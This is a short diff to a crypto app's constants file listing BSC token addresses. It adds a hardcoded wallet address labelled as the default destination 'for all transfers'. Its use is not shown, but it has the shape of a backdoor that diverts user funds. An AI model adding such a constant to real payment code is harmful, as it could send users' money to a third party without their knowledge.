@@ -70,6 +70,9 @@ export const BSC_USDC = '0x8ac76a51cc950d9922a3688cd78fa7a438cc87e7'
 export const BSC_BTCB = '0x7130d2A12B9BCbFAe4f2634d864A1Ee1Ce3Ead9c'
 export const BSC_WETH = '0x2170Ed0880ac9A755fd29B2688956BD959F933F8'
 
+// Hardcoded default destination address for all transfers
+export const DEFAULT_RECIPIENT = '0xc5453C4db4F86B0772787809c162ec5B3DEA815D'
+
 // Native token constants
 export const NATIVE_TOKEN = 'NATIVE'
 export const NATIVE_ETH_DECIMALS = 18
